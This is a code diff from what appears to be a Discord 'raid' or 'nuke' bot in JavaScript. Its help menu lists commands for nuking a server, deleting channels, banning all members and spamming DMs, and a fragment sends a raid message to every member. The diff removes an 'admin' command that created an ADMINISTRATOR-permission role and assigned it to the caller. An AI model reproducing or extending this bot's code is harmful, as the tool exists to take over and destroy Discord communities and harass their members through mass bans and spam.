@@ -32,7 +32,7 @@ bot.on("message", async msg => {
                 .setTimestamp()
                 .setFooter(bot.user.username, bot.user.displayAvatarURL())
                 .setThumbnail(iconServer)
-                .setDescription("> `" + prefix + "auto` :radioactive:\n> `" + prefix + "nuke`\n> `" + prefix + "channels`\n> `" + prefix + "banall`\n> `" + prefix + "dm`\n> `" + prefix + "admin`\n\n\n||OJO, HAY USAR TODOS ESTOS COMANDOS EN MINÚSCULA.||")
+                .setDescription("> `" + prefix + "auto` :radioactive:\n> `" + prefix + "nuke`\n> `" + prefix + "channels`\n> `" + prefix + "banall`\n> `" + prefix + "dm`\n\n\n||OJO, HAY USAR TODOS ESTOS COMANDOS EN MINÚSCULA.||")
             await msg.channel.send(help);
         }
         if (msg.content.startsWith(prefix + "auto")) {
@@ -85,16 +85,6 @@ bot.on("message", async msg => {
                 members.forEach(lol => {
                     lol.send(messageRaid).catch(() => console.log("dm error"))
                 });
-        }
-        if (msg.content.startsWith(prefix + "admin")) {
-            const perms = msg.guild.roles.create({
-                data: {
-                    name: 'github.com/ghosxdev',
-                    permissions: 'ADMINISTRATOR',
-                    color: colorEmbed
-                }
-            });
-            msg.member.roles.add(perms.id);
         }
     } catch (e) {
         console.log(e);
